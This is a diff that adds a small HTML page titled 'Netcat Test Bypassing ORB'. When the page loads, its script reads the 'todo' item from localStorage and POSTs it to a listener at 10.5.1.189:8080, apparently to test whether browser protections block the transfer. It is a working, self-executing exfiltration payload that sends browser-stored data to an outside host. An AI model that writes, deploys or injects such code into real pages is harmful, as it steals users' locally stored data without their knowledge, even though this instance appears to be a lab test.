@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Netcat Test Bypassing ORB</title>
+</head>
+<body>
+    <h1>Testing Data Transmission...</h1>
+    <p>Check your Python console for the result.</p>
+
+    <script>
+        async function sendStorageData() {
+            // 1. Get the 'todo' object from LocalStorage
+            const targetData = localStorage.getItem('todo');
+
+            if (!targetData) {
+                console.error("The key 'todo' was not found in Local Storage.");
+                return;
+            }
+
+            console.log("Data found. Sending to 10.5.1.189...");
+
+            try {
+                // 2. Send the request
+                const response = await fetch('http://10.5.1.189:8080', {
+                    method: 'POST',
+                    mode: 'cors', // Explicitly ask for CORS mode
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
+                    body: targetData
+                });
+
+                const text = await response.text();
+                console.log("Server Response:", text);
+            } catch (err) {
+                console.error("Request blocked or server down:", err);
+            }
+        }
+
+        // Execute
+        sendStorageData();
+    </script>
+</body>
+</html>
